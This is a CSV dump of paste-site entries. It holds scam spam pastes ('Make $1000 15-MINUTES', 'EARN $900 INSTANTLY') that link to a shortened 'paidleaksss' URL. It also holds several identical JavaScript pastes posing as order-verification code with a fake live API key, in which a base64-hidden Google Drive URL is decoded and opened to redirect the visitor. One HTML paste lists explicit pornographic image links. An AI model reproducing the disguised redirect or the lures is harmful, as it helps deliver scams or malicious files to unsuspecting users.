id,title,username,language,date,content
AjsaZ5ZL,Make $1000 15-MINUTES (BEGINNER) RQ,THA_HD,JavaScript,Saturday 5th of April 2025 12:58:53 AM CDT," 
Pdf https://tinyurl.com/paidleaksss


CSDVJfYxsK
"
q4sxPRB5,Market.js,kammex,JavaScript,Saturday 5th of April 2025 12:53:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45177/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Vh6vKq2n,EARN $900 INSTANTLY 2025 V9,THA_HD,JavaScript,Saturday 5th of April 2025 12:42:58 AM CDT," 
Pdf https://tinyurl.com/paidleaksss


Z5ZtDUyF1O
"
LBmtQWDf,Untitled,kammex,JavaScript,Saturday 5th of April 2025 12:37:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47501/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vZZArQxs,Make $1000 15-MINUTES (BEGINNER) RV,THA_HD,JavaScript,Saturday 5th of April 2025 12:27:02 AM CDT," 
Pdf https://tinyurl.com/paidleaksss


4TpwKV2967
"
LRJNVfhS,Products.js,kammex,JavaScript,Saturday 5th of April 2025 12:22:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87451/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nfhH72WK,Mens only (Apr 5 2025),MarcSpencer,HTML,Saturday 5th of April 2025 12:15:30 AM CDT,"Derek, Beaux and Jaxon 
<a href=""https://fappic.com/z9w4q2hlfhl9/randy-blue-derek-beaux-and-jaxon-001.jpg""><img src=""https://img103.fappic.com/i/03913/z9w4q2hlfhl9_t.jpg""></a><a href=""https://fappic.com/6tej053gl7b7/randy-blue-derek-beaux-and-jaxon-002.jpg""><img src=""https://img103.fappic.com/i/03913/6tej053gl7b7_t.jpg""></a><a href=""https://fappic.com/udozg7z0wvgi/randy-blue-derek-beaux-and-jaxon-003.jpg""><img src=""https://img103.fappic.com/i/03913/udozg7z0wvgi_t.jpg""></a><a href=""https://fappic.com/m95n4dgz7nr2/randy-blue-derek-beaux-and-jaxon-004.jpg""><img src=""https://img103.fappic.com/i/03913/m95n4dgz7nr2_t.jpg""></a><a href=""https://fappic.com/ptbqy2kq5zzk/randy-blue-derek-beaux-and-jaxon-005.jpg""><img src=""https://img103.fappic.com/i/03913/ptbqy2kq5zzk_t.jpg""></a><a href=""https://fappic.com/yt82cycd7met/randy-blue-derek-beaux-and-jaxon-006.jpg""><img src=""https://img103.fappic.com/i/03913/yt82cycd7met_t.jpg""></a><a href=""https://fappic.com/tq8lx9w6b0i5/randy-blue-derek-beaux-and-jaxon-007.jpg""><img src=""https://img103.fappic.com/i/03913/tq8lx9w6b0i5_t.jpg""></a><a href=""https://fappic.com/kfesuv2vumc9/randy-blue-derek-beaux-and-jaxon-008.jpg""><img src=""https://img103.fappic.com/i/03913/kfesuv2vumc9_t.jpg""></a><a href=""https://fappic.com/3nfq77hwgomw/randy-blue-derek-beaux-and-jaxon-009.jpg""><img src=""https://img103.fappic.com/i/03913/3nfq77hwgomw_t.jpg""></a><a href=""https://fappic.com/3pzmnbelkmrt/randy-blue-derek-beaux-and-jaxon-010.jpg""><img src=""https://img103.fappic.com/i/03913/3pzmnbelkmrt_t.jpg""></a><a href=""https://fappic.com/ajzjttrsvb3m/randy-blue-derek-beaux-and-jaxon-011.jpg""><img src=""https://img103.fappic.com/i/03913/ajzjttrsvb3m_t.jpg""></a><a href=""https://fappic.com/t2hp82dbwrc3/randy-blue-derek-beaux-and-jaxon-012.jpg""><img src=""https://img103.fappic.com/i/03913/t2hp82dbwrc3_t.jpg""></a><a href=""https://fappic.com/2rsgqvy25hlr/randy-blue-derek-beaux-and-jaxon-013.jpg""><img src=""https://img103.fappic.com/i/03913/2rsgqvy25hlr_t.jpg""></a><a href=""https://fappic.com/znsbgd706wec/randy-blue-derek-beaux-and-jaxon-014.jpg""><img src=""https://img103.fappic.com/i/03913/znsbgd706wec_t.jpg""></a><a href=""https://fappic.com/59n79ifzsehv/randy-blue-derek-beaux-and-jaxon-015.jpg""><img src=""https://img103.fappic.com/i/03913/59n79ifzsehv_t.jpg""></a><a href=""https://fappic.com/yk7aczffva8y/randy-blue-derek-beaux-and-jaxon-016.jpg""><img src=""https://img103.fappic.com/i/03913/yk7aczffva8y_t.jpg""></a><a href=""https://fappic.com/fw0t845iitg1/randy-blue-derek-beaux-and-jaxon-017.jpg""><img src=""https://img103.fappic.com/i/03913/fw0t845iitg1_t.jpg""></a><a href=""https://fappic.com/rivs5dede3bk/randy-blue-derek-beaux-and-jaxon-018.jpg""><img src=""https://img103.fappic.com/i/03913/rivs5dede3bk_t.jpg""></a><a href=""https://fappic.com/44w2q1igx3cm/randy-blue-derek-beaux-and-jaxon-019.jpg""><img src=""https://img103.fappic.com/i/03913/44w2q1igx3cm_t.jpg""></a><a href=""https://fappic.com/9l9ldkwy186t/randy-blue-derek-beaux-and-jaxon-020.jpg""><img src=""https://img103.fappic.com/i/03913/9l9ldkwy186t_t.jpg""></a><a href=""https://fappic.com/qskj6ifuaczx/randy-blue-derek-beaux-and-jaxon-021.jpg""><img src=""https://img103.fappic.com/i/03913/qskj6ifuaczx_t.jpg""></a><a href=""https://fappic.com/qlgmrx1i8ys1/randy-blue-derek-beaux-and-jaxon-022.jpg""><img src=""https://img103.fappic.com/i/03913/qlgmrx1i8ys1_t.jpg""></a>

MrDeepVoice screws Dani Robles 
<a href=""https://fappic.com/h8imdvj82wnn/men-at-play-mrdeepvoice-screws-dani-robles-001.jpg""><img src=""https://img103.fappic.com/i/03913/h8imdvj82wnn_t.jpg""></a><a href=""https://fappic.com/wdsns92hou2v/men-at-play-mrdeepvoice-screws-dani-robles-002.jpg""><img src=""https://img103.fappic.com/i/03913/wdsns92hou2v_t.jpg""></a><a href=""https://fappic.com/5geimmeu2jos/men-at-play-mrdeepvoice-screws-dani-robles-003.jpg""><img src=""https://img103.fappic.com/i/03913/5geimmeu2jos_t.jpg""></a><a href=""https://fappic.com/8awwarxttufn/men-at-play-mrdeepvoice-screws-dani-robles-004.jpg""><img src=""https://img103.fappic.com/i/03913/8awwarxttufn_t.jpg""></a><a href=""https://fappic.com/7zqpvgjufe05/men-at-play-mrdeepvoice-screws-dani-robles-005.jpg""><img src=""https://img103.fappic.com/i/03913/7zqpvgjufe05_t.jpg""></a><a href=""https://fappic.com/eh78hvonyp4i/men-at-play-mrdeepvoice-screws-dani-robles-006.jpg""><img src=""https://img103.fappic.com/i/03913/eh78hvonyp4i_t.jpg""></a><a href=""https://fappic.com/8v7qarid8t3x/men-at-play-mrdeepvoice-screws-dani-robles-007.jpg""><img src=""https://img103.fappic.com/i/03913/8v7qarid8t3x_t.jpg""></a><a href=""https://fappic.com/6zrjwz9engmk/men-at-play-mrdeepvoice-screws-dani-robles-008.jpg""><img src=""https://img103.fappic.com/i/03913/6zrjwz9engmk_t.jpg""></a><a href=""https://fappic.com/p10ks9u12j84/men-at-play-mrdeepvoice-screws-dani-robles-009.jpg""><img src=""https://img103.fappic.com/i/03913/p10ks9u12j84_t.jpg""></a><a href=""https://fappic.com/h06zc1e7mjjx/men-at-play-mrdeepvoice-screws-dani-robles-010.jpg""><img src=""https://img103.fappic.com/i/03913/h06zc1e7mjjx_t.jpg""></a><a href=""https://fappic.com/d3ainqb1x0qv/men-at-play-mrdeepvoice-screws-dani-robles-011.jpg""><img src=""https://img103.fappic.com/i/03913/d3ainqb1x0qv_t.jpg""></a><a href=""https://fappic.com/s6t8c5z763zz/men-at-play-mrdeepvoice-screws-dani-robles-012.jpg""><img src=""https://img103.fappic.com/i/03913/s6t8c5z763zz_t.jpg""></a><a href=""https://fappic.com/cgolwzku00s1/men-at-play-mrdeepvoice-screws-dani-robles-013.jpg""><img src=""https://img103.fappic.com/i/03913/cgolwzku00s1_t.jpg""></a><a href=""https://fappic.com/s5dfoa2v6x2f/men-at-play-mrdeepvoice-screws-dani-robles-014.jpg""><img src=""https://img103.fappic.com/i/03913/s5dfoa2v6x2f_t.jpg""></a><a href=""https://fappic.com/h2gycoibgvee/men-at-play-mrdeepvoice-screws-dani-robles-015.jpg""><img src=""https://img103.fappic.com/i/03913/h2gycoibgvee_t.jpg""></a><a href=""https://fappic.com/n8lucp85mk4c/men-at-play-mrdeepvoice-screws-dani-robles-016.jpg""><img src=""https://img103.fappic.com/i/03913/n8lucp85mk4c_t.jpg""></a>

Riley Mitchel and Kev Inspiring 
<a href=""https://fappic.com/2rb706s3woic/naked-sword-riley-mitchel-and-kev-inspiring-001.jpg""><img src=""https://img103.fappic.com/i/03913/2rb706s3woic_t.jpg""></a><a href=""https://fappic.com/tumq4qnrcka1/naked-sword-riley-mitchel-and-kev-inspiring-002.jpg""><img src=""https://img103.fappic.com/i/03913/tumq4qnrcka1_t.jpg""></a><a href=""https://fappic.com/rgua95w4a7bx/naked-sword-riley-mitchel-and-kev-inspiring-003.jpg""><img src=""https://img103.fappic.com/i/03913/rgua95w4a7bx_t.jpg""></a><a href=""https://fappic.com/udb1lkabkj73/naked-sword-riley-mitchel-and-kev-inspiring-004.jpg""><img src=""https://img103.fappic.com/i/03913/udb1lkabkj73_t.jpg""></a><a href=""https://fappic.com/ft4211t2izfo/naked-sword-riley-mitchel-and-kev-inspiring-005.jpg""><img src=""https://img103.fappic.com/i/03913/ft4211t2izfo_t.jpg""></a><a href=""https://fappic.com/25ao5a4p1jfq/naked-sword-riley-mitchel-and-kev-inspiring-006.jpg""><img src=""https://img103.fappic.com/i/03913/25ao5a4p1jfq_t.jpg""></a><a href=""https://fappic.com/wjb67bihrqgr/naked-sword-riley-mitchel-and-kev-inspiring-007.jpg""><img src=""https://img103.fappic.com/i/03913/wjb67bihrqgr_t.jpg""></a><a href=""https://fappic.com/bd9rsr1yu2so/naked-sword-riley-mitchel-and-kev-inspiring-008.jpg""><img src=""https://img103.fappic.com/i/03913/bd9rsr1yu2so_t.jpg""></a><a href=""https://fappic.com/aqk0zt13a5u2/naked-sword-riley-mitchel-and-kev-inspiring-009.jpg""><img src=""https://img103.fappic.com/i/03913/aqk0zt13a5u2_t.jpg""></a><a href=""https://fappic.com/pp3tdf1rfniy/naked-sword-riley-mitchel-and-kev-inspiring-010.jpg""><img src=""https://img103.fappic.com/i/03913/pp3tdf1rfniy_t.jpg""></a><a href=""https://fappic.com/hq5akkf8z8fa/naked-sword-riley-mitchel-and-kev-inspiring-011.jpg""><img src=""https://img103.fappic.com/i/03913/hq5akkf8z8fa_t.jpg""></a><a href=""https://fappic.com/s27qcr9or5j0/naked-sword-riley-mitchel-and-kev-inspiring-012.jpg""><img src=""https://img103.fappic.com/i/03913/s27qcr9or5j0_t.jpg""></a><a href=""https://fappic.com/utl173wgh7le/naked-sword-riley-mitchel-and-kev-inspiring-013.jpg""><img src=""https://img103.fappic.com/i/03913/utl173wgh7le_t.jpg""></a><a href=""https://fappic.com/qyauoqlsozxe/naked-sword-riley-mitchel-and-kev-inspiring-014.jpg""><img src=""https://img103.fappic.com/i/03913/qyauoqlsozxe_t.jpg""></a><a href=""https://fappic.com/97hqhu96nmw3/naked-sword-riley-mitchel-and-kev-inspiring-015.jpg""><img src=""https://img103.fappic.com/i/03913/97hqhu96nmw3_t.jpg""></a>

Joaquin Santana rides Jack Aries 
<a href=""https://fappic.com/6qcvnvlhecgf/cocky-boys-joaquin-santana-rides-jack-aries-001.jpg""><img src=""https://img103.fappic.com/i/03913/6qcvnvlhecgf_t.jpg""></a><a href=""https://fappic.com/ohllrfgi34e7/cocky-boys-joaquin-santana-rides-jack-aries-002.jpg""><img src=""https://img103.fappic.com/i/03913/ohllrfgi34e7_t.jpg""></a><a href=""https://fappic.com/ibrbhao57461/cocky-boys-joaquin-santana-rides-jack-aries-003.jpg""><img src=""https://img103.fappic.com/i/03913/ibrbhao57461_t.jpg""></a><a href=""https://fappic.com/knctnr0jg4r5/cocky-boys-joaquin-santana-rides-jack-aries-004.jpg""><img src=""https://img103.fappic.com/i/03913/knctnr0jg4r5_t.jpg""></a><a href=""https://fappic.com/ke2q2gbz31v7/cocky-boys-joaquin-santana-rides-jack-aries-005.jpg""><img src=""https://img103.fappic.com/i/03913/ke2q2gbz31v7_t.jpg""></a><a href=""https://fappic.com/f386cku4iqly/cocky-boys-joaquin-santana-rides-jack-aries-006.jpg""><img src=""https://img103.fappic.com/i/03913/f386cku4iqly_t.jpg""></a><a href=""https://fappic.com/vedts3wkf0zj/cocky-boys-joaquin-santana-rides-jack-aries-007.jpg""><img src=""https://img103.fappic.com/i/03913/vedts3wkf0zj_t.jpg""></a><a href=""https://fappic.com/xpchh644lt7m/cocky-boys-joaquin-santana-rides-jack-aries-008.jpg""><img src=""https://img103.fappic.com/i/03913/xpchh644lt7m_t.jpg""></a><a href=""https://fappic.com/gjw940oddtj1/cocky-boys-joaquin-santana-rides-jack-aries-009.jpg""><img src=""https://img103.fappic.com/i/03913/gjw940oddtj1_t.jpg""></a><a href=""https://fappic.com/1g87y7i81lpw/cocky-boys-joaquin-santana-rides-jack-aries-010.jpg""><img src=""https://img103.fappic.com/i/03913/1g87y7i81lpw_t.jpg""></a><a href=""https://fappic.com/g05qn91cb53o/cocky-boys-joaquin-santana-rides-jack-aries-011.jpg""><img src=""https://img103.fappic.com/i/03913/g05qn91cb53o_t.jpg""></a><a href=""https://fappic.com/c8ruy6f5pwi9/cocky-boys-joaquin-santana-rides-jack-aries-012.jpg""><img src=""https://img103.fappic.com/i/03913/c8ruy6f5pwi9_t.jpg""></a><a href=""https://fappic.com/dvh3g032nw0z/cocky-boys-joaquin-santana-rides-jack-aries-013.jpg""><img src=""https://img103.fappic.com/i/03913/dvh3g032nw0z_t.jpg""></a><a href=""https://fappic.com/x2jibr6p8ei4/cocky-boys-joaquin-santana-rides-jack-aries-014.jpg""><img src=""https://img103.fappic.com/i/03913/x2jibr6p8ei4_t.jpg""></a><a href=""https://fappic.com/xwd354b8azbi/cocky-boys-joaquin-santana-rides-jack-aries-015.jpg""><img src=""https://img103.fappic.com/i/03913/xwd354b8azbi_t.jpg""></a><a href=""https://fappic.com/2sarq1iriid8/cocky-boys-joaquin-santana-rides-jack-aries-016.jpg""><img src=""https://img103.fappic.com/i/03913/2sarq1iriid8_t.jpg""></a><a href=""https://fappic.com/rrlyqqqzsqte/cocky-boys-joaquin-santana-rides-jack-aries-017.jpg""><img src=""https://img103.fappic.com/i/03913/rrlyqqqzsqte_t.jpg""></a><a href=""https://fappic.com/inxlwzlh0a90/cocky-boys-joaquin-santana-rides-jack-aries-018.jpg""><img src=""https://img103.fappic.com/i/03913/inxlwzlh0a90_t.jpg""></a><a href=""https://fappic.com/i00g0u0m09bi/cocky-boys-joaquin-santana-rides-jack-aries-019.jpg""><img src=""https://img103.fappic.com/i/03913/i00g0u0m09bi_t.jpg""></a><a href=""https://fappic.com/sqqo4nbltjv5/cocky-boys-joaquin-santana-rides-jack-aries-020.jpg""><img src=""https://img103.fappic.com/i/03913/sqqo4nbltjv5_t.jpg""></a>"
BAyvQyxb,EARN $900 INSTANTLY 2025 V9,calvin_mao,JavaScript,Saturday 5th of April 2025 12:10:47 AM CDT," 
Pdf https://tinyurl.com/paidleaksss


cW3B5Vh7is
"
SBy5VYD1,Order.js,kammex,JavaScript,Saturday 5th of April 2025 12:07:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15485/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jL4GvAzx,Market.js,kammex,JavaScript,Friday 4th of April 2025 11:51:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88120/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
